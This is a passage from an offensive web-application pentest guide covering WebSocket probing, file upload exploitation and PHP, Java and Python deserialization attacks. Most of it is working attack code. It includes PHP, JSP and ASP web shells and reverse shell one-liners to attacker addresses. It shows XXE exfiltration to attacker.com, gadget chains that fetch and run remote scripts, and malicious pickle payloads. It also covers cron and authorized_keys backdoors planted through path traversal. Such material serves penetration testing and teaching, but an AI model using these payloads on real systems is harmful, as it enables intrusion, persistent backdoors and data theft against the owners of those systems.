            forward_to_client()
        )

start_server = websockets.serve(proxy_handler, "0.0.0.0", 8765)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
EOF
```

**WebSocket Information Disclosure**

```bash
# Test for sensitive data in messages
websocat ws://target.com/socket | tee ws_messages.log
# Review log for:
# - API keys, tokens, secrets
# - User PII (emails, addresses, SSN)
# - Internal IP addresses, hostnames
# - Database queries, stack traces
# - Session identifiers

# Subscribe to all channels
websocat ws://target.com/socket << 'EOF'
{"action":"subscribe","channel":"*"}
{"action":"subscribe","channel":"admin"}
{"action":"subscribe","channel":"logs"}
{"action":"subscribe","channel":"debug"}
EOF

# Test for message replay attacks
# Capture a valid message:
# {"action":"transfer","from":1,"to":2,"amount":100,"signature":"abc123"}
# Replay it multiple times
for i in {1..10}; do
  echo '{"action":"transfer","from":1,"to":2,"amount":100,"signature":"abc123"}' | websocat ws://target.com/socket
done
```

**Socket.IO Specific Testing**

Socket.IO is a popular WebSocket library with specific testing approaches:

```bash
# Connect to Socket.IO endpoint
# Socket.IO uses specific path: /socket.io/?EIO=4&transport=websocket

# Test with wscat
wscat -c "wss://target.com/socket.io/?EIO=4&transport=websocket&token=TOKEN"

# Python Socket.IO client
pip3 install python-socketio
python3 << 'EOF'
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print('Connected to server')
    sio.emit('message', {'data': 'test'})

@sio.event
def message(data):
    print('Received:', data)

@sio.event
def disconnect():
    print('Disconnected from server')

sio.connect('http://target.com')
sio.wait()
EOF

# Test Socket.IO namespaces
# Namespaces are like channels: /admin, /chat, /private
websocat "ws://target.com/socket.io/?EIO=4&transport=websocket" << 'EOF'
42/admin,["auth",{"token":"TOKEN"}]
42/admin,["getUsers"]
EOF

# Socket.IO event enumeration
# Common events to test: connect, disconnect, message, error, auth, join, leave
```

**Automated WebSocket Security Testing**

```bash
# Using OWASP ZAP for WebSocket testing
# 1. Configure ZAP proxy
# 2. Connect to WebSocket through ZAP
# 3. Use Active Scan on WebSocket messages
# 4. Review WebSocket tab in ZAP for all messages

# Nuclei WebSocket templates
nuclei -u ws://target.com/socket -t ~/nuclei-templates/websocket/

# Custom fuzzing framework
# wsfuzzer (if available)
# Or use Burp Suite Intruder on WebSocket messages
```

---

**Key Reconnaissance Recommendations:**

1. **Always check for API documentation** - Swagger, OpenAPI, WSDL files often expose entire API surface
2. **Analyze JavaScript thoroughly** - Frontend code frequently contains hardcoded endpoints and logic
3. **Test authentication on ALL discovered endpoints** - Older versions may lack proper auth
4. **Monitor WebSocket traffic carefully** - Real-time data often contains sensitive information
5. **Combine multiple discovery techniques** - Wayback Machine + JS analysis + fuzzing gives comprehensive coverage

---

## File Upload Exploitation

### Arbitrary File Upload

Arbitrary file upload vulnerabilities occur when an application accepts file uploads without proper validation of file type, content, or destination. Attackers can upload malicious files that execute server-side code, overwrite critical files, or serve as stepping stones for further exploitation.

**Key Testing Approach:**

- Identify all file upload functionality in the application
- Test for direct execution of uploaded files by accessing them via web browser
- Check if uploaded files are stored in web-accessible directories
- Verify if the application executes uploaded files server-side

**Basic exploitation workflow:**

```bash
# Create a simple PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload the file through the application
# Then access it directly
curl http://target.com/uploads/shell.php?cmd=whoami
```

Common upload directories to check:

- `/uploads/`
- `/files/`
- `/media/`
- `/assets/`
- `/tmp/`
- `/var/www/html/uploads/`

### Unrestricted File Upload

This occurs when no restrictions exist on file types, sizes, or content. The application accepts any file format and stores it without validation.

**Exploitation methodology:**

1. **Web shell upload** (most common):

```php
// Simple PHP shell
<?php system($_GET['c']); ?>

// More featured shell
<?php
if(isset($_REQUEST['c'])){
    echo "<pre>";
    $c = ($_REQUEST['c']);
    system($c);
    echo "</pre>";
}
?>
```

2. **JSP shell for Java applications**:

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
%>
```

3. **ASP/ASPX shell for Windows IIS**:

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.Write(oExec.StdOut.ReadAll)
End If
%>
```

**Testing with curl:**

```bash
# Upload file
curl -X POST -F "file=@shell.php" http://target.com/upload.php

# Access uploaded shell
curl http://target.com/uploads/shell.php?c=id

# Establish reverse shell
curl "http://target.com/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### File Extension Bypass

Applications often implement blacklists or whitelists for file extensions. Multiple techniques exist to bypass these restrictions.

**Common bypass techniques:**

1. **Case variation**:

```bash
shell.PHP
shell.PhP
shell.pHp
```

2. **Double extensions**:

```bash
shell.php.jpg
shell.jpg.php
image.png.php
```

3. **Null byte injection** [Inference - effectiveness depends on language version]:

```bash
shell.php%00.jpg
shell.php\x00.png
```

4. **Alternate extensions**:

```bash
# PHP alternatives
.php3, .php4, .php5, .php7, .pht, .phtml, .phps, .phar

# ASP alternatives  
.asp, .aspx, .cer, .asa, .asax, .ashx, .asmx

# JSP alternatives
.jsp, .jspx, .jsw, .jsv, .jspf
```

5. **Appended extensions**:

```bash
shell.php.test
shell.php.invalidext
```

6. **Special characters**:

```bash
shell.php.
shell.php::$DATA  # Windows only
shell.php;.jpg
shell.php%0a.jpg
```

**Automated testing with Burp Suite Intruder:**

```
# Position marker on extension
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.§php§"

# Payload list:
php
php3
php4
php5
phtml
pht
```

**Testing script example**:

```bash
#!/bin/bash
extensions=("php" "php3" "php4" "php5" "phtml" "pht" "phps")

for ext in "${extensions[@]}"; do
    cp shell.php "shell.$ext"
    curl -X POST -F "file=@shell.$ext" http://target.com/upload
    response=$(curl -s http://target.com/uploads/shell.$ext?c=id)
    if [[ $response == *"uid="* ]]; then
        echo "[+] Success with extension: .$ext"
        break
    fi
done
```

### MIME Type Bypass

MIME type validation checks the `Content-Type` header in HTTP requests. This is insufficient security as it can be easily manipulated.

**Understanding MIME validation:**

Applications check the `Content-Type` header:

```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: application/pdf
```

**Bypass methodology:**

1. **Simple header manipulation**:

```bash
# Original malicious request
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['c']); ?>

# Modified with fake MIME type
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

2. **Using curl with custom headers**:

```bash
curl -X POST \
  -F "file=@shell.php;type=image/jpeg" \
  http://target.com/upload.php

# Alternative syntax
curl -X POST \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php" \
  -F "type=image/png" \
  http://target.com/upload
```

3. **With Burp Suite**:

- Intercept the upload request
- Locate the `Content-Type` line in the multipart section
- Change from `application/x-php` to `image/jpeg` or `image/png`
- Forward the request

**Common accepted MIME types to spoof:**

```
image/jpeg
image/png
image/gif
application/pdf
text/plain
application/octet-stream
```

### Polyglot File Exploitation

Polyglot files are valid in multiple file formats simultaneously. They bypass validation that checks file headers (magic bytes) while still executing as malicious code.

**PHP/Image polyglots:**

1. **GIF + PHP**:

```bash
# Create polyglot
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.gif

# Or with actual GIF structure
printf 'GIF89a' > polyglot.php
echo '<?php system($_GET["c"]); ?>' >> polyglot.php

# Upload as shell.gif or shell.php
```

2. **JPEG + PHP using exiftool**:

```bash
# Create legitimate JPEG
convert -size 32x32 xc:white empty.jpg

# Inject PHP code into comment field
exiftool -Comment='<?php system($_GET["c"]); ?>' empty.jpg

# Rename to PHP extension
mv empty.jpg shell.php.jpg

# Or keep as .jpg if server misconfiguration allows execution
```

3. **PNG + PHP**:

```bash
# Create PNG with embedded PHP
cat image.png - > polyglot.php <<EOF
<?php system(\$_GET['c']); ?>
EOF
```

**Advanced polyglot creation with custom tools:**

```python
#!/usr/bin/env python3
# Simple polyglot generator

def create_gif_php_polyglot(output_file):
    gif_header = b'GIF89a'
    php_code = b'<?php system($_GET["cmd"]); ?>'
    
    with open(output_file, 'wb') as f:
        f.write(gif_header)
        f.write(php_code)
    
    print(f"[+] Polyglot created: {output_file}")

create_gif_php_polyglot("shell.php")
```

**Using `exiftool` for advanced injection**:

```bash
# View current metadata
exiftool image.jpg

# Inject in multiple fields
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
exiftool -DocumentName='<?php system($_GET["c"]); ?>' image.jpg

# Create with .php extension but valid image header
cp modified_image.jpg shell.php
```

**Testing polyglot execution:**

```bash
# After upload, try both extensions
curl http://target.com/uploads/shell.gif?c=whoami
curl http://target.com/uploads/shell.php?c=whoami

# Check if .htaccess allows GIF execution
curl http://target.com/uploads/shell.gif?c=id
```

### XXE via File Upload

XML External Entity (XXE) attacks through file uploads exploit XML parsers that process uploaded files containing malicious entity definitions.

**Basic XXE payload in SVG**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**XXE for SSRF (Server-Side Request Forgery)**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**Out-of-band XXE for data exfiltration**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">XXE</text>
</svg>
```

**External DTD file (`evil.dtd` on attacker server)**:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**XXE in DOCX files:**

```bash
# Extract DOCX (it's a ZIP archive)
unzip document.docx -d docx_extracted

# Edit word/document.xml
nano docx_extracted/word/document.xml

# Add XXE payload at beginning
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# Reference entity in document body
<w:t>&xxe;</w:t>

# Repackage
cd docx_extracted
zip -r ../malicious.docx *
```

**XXE in XLSX files:**

```bash
# Extract
unzip spreadsheet.xlsx -d xlsx_extracted

# Edit xl/workbook.xml
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>

# Reference in cell
<t>&xxe;</t>

# Repackage
cd xlsx_extracted
zip -r ../malicious.xlsx *
```

**Testing XXE upload:**

```bash
# Create malicious SVG
cat > xxe.svg <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
EOF

# Upload
curl -X POST -F "file=@xxe.svg" http://target.com/upload

# Access to trigger parsing
curl http://target.com/view?file=xxe.svg
```

**Listener for out-of-band XXE:**

```bash
# Start HTTP server to receive exfiltrated data
python3 -m http.server 80

# Or use netcat
nc -lvnp 80

# Monitor for incoming requests with data
```

### RCE via File Upload

Remote Code Execution through file uploads involves uploading files that execute arbitrary system commands on the server.

**PHP-based RCE:**

1. **Basic command execution**:

```php
<?php system($_GET['c']); ?>
```

2. **Alternative PHP execution functions**:

```php
<?php exec($_GET['c'], $output); print_r($output); ?>
<?php passthru($_GET['c']); ?>
<?php shell_exec($_GET['c']); ?>
<?php `{$_GET['c']}`; ?>
<?php popen($_GET['c'], 'r'); ?>
```

3. **Full-featured web shell** (e.g., p0wny-shell):

```bash
# Download existing shells
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

# Or use Kali's built-in shells
locate php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php .

# Edit with your IP and port
sed -i 's/ATTACKER_IP/10.10.14.5/g' php-reverse-shell.php
sed -i 's/ATTACKER_PORT/4444/g' php-reverse-shell.php
```

**Python-based RCE** (if Python CGI is enabled):

```python
#!/usr/bin/python3
import cgi
import subprocess

form = cgi.FieldStorage()
cmd = form.getvalue('c')
output = subprocess.check_output(cmd, shell=True)
print("Content-Type: text/plain\n")
print(output.decode())
```

**Perl-based RCE**:

```perl
#!/usr/bin/perl
use CGI;
$q = CGI->new;
print $q->header;
$cmd = $q->param('c');
print `$cmd`;
```

**Reverse shell establishment:**

1. **Set up listener**:

```bash
nc -lvnp 4444
```

2. **Upload reverse shell payload**:

```php
<?php
$sock=fsockopen("10.10.14.5",4444);
$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

3. **Trigger execution**:

```bash
curl http://target.com/uploads/revshell.php
```

**Alternative reverse shell one-liners to execute via uploaded shell:**

```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Perl reverse shell
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Metasploit web delivery:**

```bash
msfconsole
use exploit/multi/script/web_delivery
set target 1  # PHP
set payload php/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit

# Copy the generated command and execute via uploaded shell
curl "http://target.com/uploads/shell.php?c=php+-r+GENERATED_PAYLOAD"
```

### Path Traversal via Filename

Path traversal in file uploads allows attackers to write files to arbitrary locations on the server by manipulating the filename parameter.

**Basic path traversal payloads:**

```bash
# Linux path traversal
../../../../../../etc/cron.d/shell
../../../var/www/html/shell.php
../../../../tmp/shell.php

# Windows path traversal
..\..\..\..\windows\system32\shell.exe
..\..\..\inetpub\wwwroot\shell.aspx
```

**Testing methodology:**

1. **Intercept upload request**:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"

test content
```

2. **Modify filename parameter**:

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

3. **URL-encoded variations**:

```
filename="..%2f..%2f..%2fetc%2fcron.d%2fshell"
filename="..%252f..%252f..%252fvar%252fwww%252fhtml%252fshell.php"  # Double encoding
```

**Cron job persistence via path traversal:**

```bash
# Create malicious cron job
cat > cronjob <<EOF
* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
EOF

# Upload with traversal to /etc/cron.d/
# Filename: ../../../../etc/cron.d/shell

# Wait for cron execution (up to 1 minute)
nc -lvnp 4444
```

**Overwriting critical files:**

```bash
# SSH authorized_keys
# Filename: ../../../../root/.ssh/authorized_keys
# Content: Your public SSH key

# Web root index file
# Filename: ../../../../var/www/html/index.php
# Content: Web shell

# Application configuration
# Filename: ../../../config/database.php
# Content: Modified config with backdoor
```

**Null byte injection with path traversal** [Inference - language/version dependent]:

```
filename="../../../var/www/html/shell.php%00.jpg"
filename="../../../var/www/html/shell.php\x00.png"
```

**Testing script for path traversal:**

```bash
#!/bin/bash
TARGET="http://target.com/upload"
PAYLOADS=(
    "../../../../var/www/html/test1.php"
    "../../../var/www/html/test2.php"
    "../../var/www/html/test3.php"
    "../../../../tmp/test4.php"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    curl -X POST -F "file=@shell.php" \
         -H "Content-Disposition: form-data; name=\"file\"; filename=\"$payload\"" \
         "$TARGET"
    
    # Check if file is accessible
    response=$(curl -s "http://target.com/test$(basename $payload)?c=id")
    if [[ $response == *"uid="* ]]; then
        echo "[+] Success! File written to: $payload"
        break
    fi
done
```

**Combining techniques:**

```http
# Path traversal + extension bypass + MIME bypass
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

**Windows-specific targets:**

```
# IIS web root
..\..\..\..\inetpub\wwwroot\shell.aspx

# Startup folder for persistence
..\..\..\..\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.exe

# System32
..\..\..\..\Windows\System32\shell.dll
```

**Defense validation bypass:**

```bash
# If application strips "../"
....//....//....//var/www/html/shell.php

# If application removes entire "../" sequence
..././..././..././var/www/html/shell.php

# Absolute paths (if not filtered)
/var/www/html/shell.php
C:\inetpub\wwwroot\shell.aspx
```

---

## Deserialization Attacks

### PHP Object Injection

PHP object injection occurs when user-controlled data is deserialized using `unserialize()` without proper validation. Attackers can instantiate arbitrary objects and trigger magic methods (`__wakeup()`, `__destruct()`, `__toString()`) to execute unintended code or manipulate application state.

#### Magic Methods and Exploitation Chain

PHP magic methods execute automatically during object lifecycle events. Identify exploitable methods in the application codebase:

```php
// Vulnerable patterns
__wakeup()        // Called on unserialize()
__destruct()      // Called when object destroyed
__toString()      // Called when object treated as string
__invoke()        // Called when object used as function
__get()           // Called when accessing inaccessible property
__set()           // Called when setting inaccessible property
__call()          // Called when invoking inaccessible method
```

Analyze application source code (leaked, obtained via LFI, or discovered in version control):

```bash
# Search for magic method definitions
grep -r "__wakeup\|__destruct\|__toString\|__invoke" /path/to/source --include="*.php"

# Identify unserialize() calls
grep -r "unserialize" /path/to/source --include="*.php"

# Look for user-controlled input flowing to unserialize
grep -r "unserialize.*\$_" /path/to/source --include="*.php"
```

#### Gadget Chain Construction

A gadget chain connects multiple classes' magic methods to achieve code execution. Each "gadget" performs an operation that sets up the next gadget.

Example vulnerable PHP application structure:

```php
// File 1: Logger.php
class Logger {
    public $filename;
    public $data;
    
    public function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

// File 2: DatabaseConnection.php
class DatabaseConnection {
    public $config;
    
    public function __wakeup() {
        $this->connect();
    }
    
    public function connect() {
        // Vulnerable: assumes config is safe
        eval($this->config);
    }
}

// File 3: UserProfile.php
class UserProfile {
    public $logger;
    public $db;
    
    public function __toString() {
        return $this->logger->data;
    }
}
```

Construct a gadget chain:

```php
// Generate malicious serialized object
$logger = new Logger();
$logger->filename = '/var/www/html/shell.php';
$logger->data = '<?php system($_GET["cmd"]); ?>';

$db = new DatabaseConnection();
$db->config = 'system("curl attacker.com/c.sh | bash");';

$profile = new UserProfile();
$profile->logger = $logger;
$profile->db = $db;

$payload = serialize($profile);
echo urlencode($payload); // Pass to vulnerable endpoint
```

#### Identifying Deserialization Entry Points

Search for serialized data in common locations:

```bash
# Check cookies for serialized data (often base64-encoded)
# Look for patterns: O:8:"ClassName":... or similar

# Session files (if accessible)
grep -r "O:[0-9]" /tmp/sessions/ 2>/dev/null

# Database fields storing serialized objects
# Use application admin panel or SQL injection to dump data

# API responses containing serialized data
curl -v https://target.com/api/user/profile | grep -E "O:[0-9]|serialized"

# Analyze Burp Suite capture for serialization patterns
```

#### PHP Serialization Format Analysis

PHP serialization format uses specific syntax:

```
O:4:"User":2:{s:4:"name";s:5:"Alice";s:5:"email";s:14:"alice@test.com";}
  └─ O: Object type
     4: Class name length
     "User": Class name
     2: Number of properties
     s: String type
     4/"name": String length/value (property name)
     s:5:"Alice": String length/value (property value)
```

Parse and modify serialized data:

```python
#!/usr/bin/env python3
import re
import urllib.parse

def parse_php_serialized(data):
    """Parse PHP serialized data"""
    pattern = r'O:(\d+):"([^"]+)":(\d+):\{(.*?)\}'
    match = re.search(pattern, data, re.DOTALL)
    if match:
        class_len, class_name, num_props, props = match.groups()
        print(f"Class: {class_name}")
        print(f"Properties: {num_props}")
        # Further parsing of props needed for full reconstruction
        return class_name, props
    return None

def create_php_serialized_object(class_name, properties):
    """Generate PHP serialized object"""
    payload = f'O:{len(class_name)}:"{class_name}":{len(properties)}:{{'
    for prop_name, prop_value in properties.items():
        payload += f's:{len(prop_name)}:"{prop_name}";'
        if isinstance(prop_value, str):
            payload += f's:{len(prop_value)}:"{prop_value}";'
        elif isinstance(prop_value, int):
            payload += f'i:{prop_value};'
    payload += '}'
    return payload

# Example usage
payload = create_php_serialized_object("Logger", {
    "filename": "/var/www/html/shell.php",
    "data": "<?php system($_GET['cmd']); ?>"
})
print(urllib.parse.quote(payload))
```

#### POP (Property-Oriented Programming) Chain Development

[Inference] If direct code execution through magic methods is unavailable, Property-Oriented Programming chains can manipulate object properties to achieve equivalent results through legitimate application functions.

Automated tools assist with gadget chain discovery:

```bash
# Using phpggc (PHP Generic Gadget Chains) repository
# https://github.com/ambionics/phpggc

# List available gadget chains for vulnerable libraries
phpggc -l

# Generate payload for specific library
phpggc Monolog/RCE1 'phpinfo()'

# For Symfony, Laravel, WordPress plugins, etc.
phpggc Symfony/RCE1 'system("id")'
phpggc Laravel/RCE1 'id'

# Base64 encode if needed
phpggc Monolog/RCE1 'id' | base64 -w0
```

#### Testing and Exploitation

Inject payloads at identified entry points:

```bash
# Via cookie
curl -b "session=$(php -r 'echo urlencode(serialize($malicious_object));')" https://target.com

# Via POST parameter
curl -X POST https://target.com/api/user -d "profile=$(php -r 'echo urlencode(serialize($malicious_object));')"

# Via JSON (if application deserializes JSON-encoded PHP objects)
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$(echo -n 'serialized_payload' | base64)\"}"

# Monitor application logs and response codes
# Success indicators: 200, 500 errors, delayed responses, file creation
```

### Java Serialization Gadget Chains (ysoserial)

Java serialization vulnerabilities exploit the ObjectInputStream class. Attackers craft serialized objects that trigger arbitrary code during deserialization. Gadget chains exploit existing library classes to achieve execution.

#### Identifying Java Serialization

Java serialized objects have distinctive magic bytes:

```
AC ED 00 05 (hex)  → Java serialization magic number
```

Identify serialized Java objects in:

```bash
# Network traffic
tcpdump -i any -A | grep -a "^\xac\xed"

# File system
find / -type f -exec file {} \; | grep "Java"
find / -type f -name "*.ser" 2>/dev/null

# HTTP responses and cookies
# Base64-encoded serialized data: starts with rO5C or similar when decoded

# Application logs
grep -r "ObjectInputStream\|writeObject\|readObject" /var/log/ 2>/dev/null
```

#### ysoserial Tool Usage

ysoserial generates malicious serialized objects using available gadget chains. Install and use:

```bash
# Installation
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests

# List available gadget chains
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar

# Available chains typically include:
# CommonsCollections1-7, Spring1-2, ROME, JdkUtil, Groovy, Rome, Spring, etc.
```

Generate payloads for common Java exploitation scenarios:

```bash
# Basic command execution
java -jar ysoserial.jar CommonsCollections5 'calc.exe' | base64 -w0

# Reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64 -w0

# Write file
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64 -w0

# Complex chains with multiple commands
java -jar ysoserial.jar CommonsCollections3 'sh -c "curl http://attacker.com/sh.sh | bash"' | base64

# Output to file for integration testing
java -jar ysoserial.jar CommonsCollections5 'id' > /tmp/payload.ser
```

#### Gadget Chain Selection

Different chains are available depending on installed libraries:

```
CommonsCollections1-7    → Requires commons-collections 3.x or 4.x
Spring1-2                → Requires Spring framework
ROME                     → Requires ROME library (RSS feed processing)
JdkUtil                  → Uses only JDK classes (universal, but limited)
Groovy                   → Requires Groovy library
BeanFactory1-2           → Requires Spring or similar bean handling
```

Test chain availability:

```bash
# Check Java classpath for libraries
jar -tf /path/to/vulnerable-app.jar | grep -E "commons-collections|spring|rome"

# Use ysoserial to attempt multiple chains
for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7 Spring1 Spring2 ROME; do
  echo "Testing chain: $chain"
  java -jar ysoserial.jar $chain 'id' 2>&1 | head -5
done
```

#### Exploitation Scenarios

Inject serialized payloads at deserialization points:

```bash
# Via HTTP parameter (base64-encoded)
curl -X POST https://target.com/api/upload \
  -F "file=@/tmp/payload.ser" \
  -H "Content-Type: application/octet-stream"

# Via Java RMI registry (if exposed)
# First, identify RMI service
nmap -p 1099 target.com

# Exploit using marshalsec
git clone https://github.com/NickstaDB/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.gadgets CommonsCollections5 'id'

# Via custom Java client
java -cp target/ysoserial-all.jar ysoserial.exploit.JRMPListener [lport] CommonsCollections5 'touch /tmp/pwned'

# Monitor for execution
tail -f /var/log/syslog | grep -E "pwned|executed"
```

#### Custom Gadget Chain Development

[Inference] When standard chains fail, custom chains can be developed by analyzing the target application's available libraries and constructing exploitation paths through their classes.

```bash
# Analyze available classes in target application
jar -tf target-app.jar | grep -E "\.class$" | head -20

# Use gadget chain analyzers
# Custom development requires deep Java knowledge and access to decompiled sources

# Manual approach using javassist or similar bytecode manipulation
# Create custom serialized object with controlled properties
```

#### Java Deserialization Filter Bypass

Some applications implement deserialization filters. Test bypass techniques:

```bash
# Filter validation often checks class names
# Attempt polyglot payloads or encoding bypasses

# Test with encoded class names (if filter uses string matching)
# Example: instead of CommonsCollections, use Base64-encoded variant

# Polymorphic payload generation
java -jar ysoserial.jar CommonsCollections5 'id' | \
  xxd -r -p | base64 -w0

# If filter exists, attempt protocol buffer or alternative serialization
# Request application use alternative serialization format
```

### Python Pickle Exploitation

Python's `pickle` module deserializes objects, allowing arbitrary code execution through crafted pickle data. Pickle is fundamentally unsafe for untrusted data.

#### Identifying Pickle Serialization

Pickle serialized data has distinctive patterns:

```
Protocol 0 (text-based):
cmodule
class_name
(tRc...    → Stack-based commands

Protocol 2+ (binary):
\x80\x02   → Protocol 2 header
\x80\x03   → Protocol 3 header
\x80\x04   → Protocol 4 header
```

Identify pickle usage:

```bash
# Search Python source code
grep -r "pickle\|cPickle" /path/to/source --include="*.py"

# Check for pickle.loads, pickle.load, pickle.Unpickler
grep -r "pickle\.load\|Unpickler" /path/to/source --include="*.py"

# Test applications for pickle handling
# Common entry points: cookies, cached data, RPC protocols

# Magic bytes detection
xxd data_file | grep -E "^.*: 80 02|^.*: 80 03|^.*: 80 04"
```

#### Pickle Opcode Manipulation

Pickle uses a stack-based execution model. Understanding opcodes enables payload construction:

```python
#!/usr/bin/env python3
import pickle
import pickletools
import io

# Analyze pickle structure
pickle_data = b'\x80\x02c__main__\nExploit\nq\x00)\x81q\x01.'
pickletools.dis(io.BytesIO(pickle_data))

# Output shows:
# PROTO      2                              (protocol version)
# GLOBAL     '__main__ Exploit'            (load class)
# EMPTY_TUPLE                              (empty tuple)
# REDUCE                                   (call with args)
# MARK                                     (stack marker)
# STOP                                     (end)
```

#### Malicious Pickle Payload Generation

Exploit pickle's ability to instantiate and call arbitrary Python functions:

```python
#!/usr/bin/env python3
import pickle
import os
import subprocess

# Method 1: Direct code execution using __reduce__
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload1 = pickle.dumps(Exploit())

# Method 2: Using eval for complex operations
class Exploit2:
    def __reduce__(self):
        return (eval, ('__import__("os").system("id")',))

payload2 = pickle.dumps(Exploit2())

# Method 3: Subprocess for reverse shell
class ReverseShell:
    def __reduce__(self):
        cmd = 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
        return (subprocess.Popen, (['bash', '-c', cmd],))

payload3 = pickle.dumps(ReverseShell())

# Output payloads as hex for transmission
print("Payload 1 (hex):", payload1.hex())
print("Payload 1 (base64):", __import__('base64').b64encode(payload1).decode())
```

#### Low-Level Pickle Construction

Manually construct pickle opcodes for scenarios where class definition is unavailable:

```python
#!/usr/bin/env python3
import pickle
import pickletools
import io

# Manual pickle construction for code execution
# This creates a pickle that executes: os.system('id')

pickle_payload = (
    b'\x80\x03'                    # PROTO 3
    b'cos\nsystem\n'               # GLOBAL os.system
    b'X\x02\x00\x00\x00id\n'       # SHORT_BINUNICODE 'id'
    b'\x85'                         # TUPLE1
    b'R'                            # REDUCE
)

pickletools.dis(io.BytesIO(pickle_payload))

# Alternative using pickletools to construct
opcodes = [
    ('PROTO', 3),
    ('GLOBAL', ('os', 'system')),
    ('SHORT_BINUNICODE', 'id'),
    ('TUPLE1', None),
    ('REDUCE', None),
]

# Manual encoding (complex - use pickle module instead)
```

#### Exploit via Pickle Deserialization

Inject payloads at identified entry points:

```bash
# Via web application cookie
python3 << 'EOF'
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('touch /tmp/pwned',))

payload = pickle.dumps(Exploit())
cookie_value = base64.b64encode(payload).decode()
print(f"session_cookie={cookie_value}")
EOF

# Use in request
curl -b "session_cookie=$cookie_value" https://target.com

# Via POST parameter
curl -X POST https://target.com/upload \
